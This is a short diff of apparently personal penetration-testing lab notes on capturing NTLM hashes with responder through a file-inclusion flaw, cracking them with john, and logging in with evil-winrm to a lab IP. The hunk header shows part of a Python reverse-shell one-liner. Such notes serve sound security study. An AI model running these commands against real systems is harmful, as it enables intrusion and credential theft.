@@ -28,5 +28,8 @@ sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socke
   window side, file sharing protocal.
     responder is used to create a NTLM service provider.
     ON linux, evil-winrm is used to connect 8985
-      if a web is available to be Inclusive , then a NTLM hash will be showed. john to crack it.
-      evil-winrm -i 10.129.136.91 -u xx -p xx
+      **if a web is available to be Inclusive , then a NTLM hash will be showed. john to crack it.
+      evil-winrm -i 10.129.136.91 -u xx -p xx # to connect to the NTLM server to access the file on it
+
+
+
